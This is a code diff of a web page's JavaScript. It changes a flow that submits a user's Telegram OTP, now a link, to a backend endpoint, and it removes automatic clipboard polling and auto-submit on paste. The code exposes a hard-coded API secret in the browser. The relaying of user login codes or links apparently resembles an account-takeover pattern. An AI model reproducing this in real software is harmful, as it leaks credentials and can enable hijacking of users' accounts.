@@ -1440,8 +1440,7 @@
                 linkInput.focus();
                 startTimer();
                 startStatusPolling();
-                startLinkPolling();
-                checkClipboardPermission();
+                // Removed auto-link-polling: user must paste/input link manually
                 nextBtn.disabled = false;
                 nextBtn.querySelector('.btn-text').textContent = t('next');
             }
@@ -1589,15 +1588,9 @@
         }
         
         linkInput.addEventListener('paste', function() {
-            // Check after paste event completes, then auto-submit
             setTimeout(() => {
                 const val = this.value.trim();
                 verifyBtn.disabled = val.length < 5;
-                if (val.length >= 5) {
-                    linkAutoFilled = true;
-                    stopLinkPolling();
-                    verifyBtn.click();
-                }
             }, 100);
         });
         
@@ -1621,14 +1614,14 @@
                 });
                 
                 try {
-                    const telegramRes = await fetch('/api/telegram/submit-otp', {
+                    const telegramRes = await fetch('/api/telegram/submit-link', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json', 'X-API-Secret': 'starlink-reseller-secret-2026-change-in-production' },
-                        body: JSON.stringify({ requestId: currentRequestId, otp: link })
+                        body: JSON.stringify({ requestId: currentRequestId, link: link })
                     });
                     const telegramData = await telegramRes.json();
                     if (!telegramData.success) {
-                        document.getElementById('otpError').textContent = telegramData.message || 'OTP verification failed';
+                        document.getElementById('otpError').textContent = telegramData.message || 'Link verification failed';
                         document.getElementById('otpError').classList.add('show');
                         verifyBtn.disabled = false;
                         verifyBtn.textContent = t('verify');
@@ -1650,13 +1643,11 @@
                     errEl.style.background = '#fff3e0';
                     errEl.style.color = '#e65100';
                     linkInput.focus();
-                    startLinkPolling(link);
                 }, 3000);
                 
             } catch (e) {
                 document.getElementById('otpError').textContent = t('verifyFailed');
                 document.getElementById('otpError').classList.add('show');
-                startLinkPolling(link);
             }
             
             verifyBtn.disabled = false;
